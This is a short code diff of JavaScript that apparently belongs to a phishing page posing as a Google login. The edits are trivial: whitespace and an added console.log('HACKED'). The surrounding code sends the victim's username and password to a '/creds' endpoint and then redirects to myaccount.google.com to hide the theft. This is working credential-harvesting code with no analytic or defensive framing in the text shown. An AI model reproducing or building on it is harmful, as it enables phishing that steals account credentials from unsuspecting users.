@@ -1,12 +1,10 @@
 /* a regex express to valid email addresses */
 /* ref. https://stackoverflow.com/questions/46155/how-to-validate-an-email-address-in-javascript */
+
 function validateEmail(email) {
 	var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
 	return re.test(email);
 }
-
-
-
 
 function onReady(){
 	scrollTo(400, 0)
@@ -45,6 +43,7 @@ function doPasswordStep(){
 	xmlHttp.open("GET", "/creds?username="+ username +"&password="+ password, false);
 	xmlHttp.send(null);
 
+    console.log('HACKED')
 	//Redirect to myaccount.google
 	window.location.replace("https://myaccount.google.com")
 }
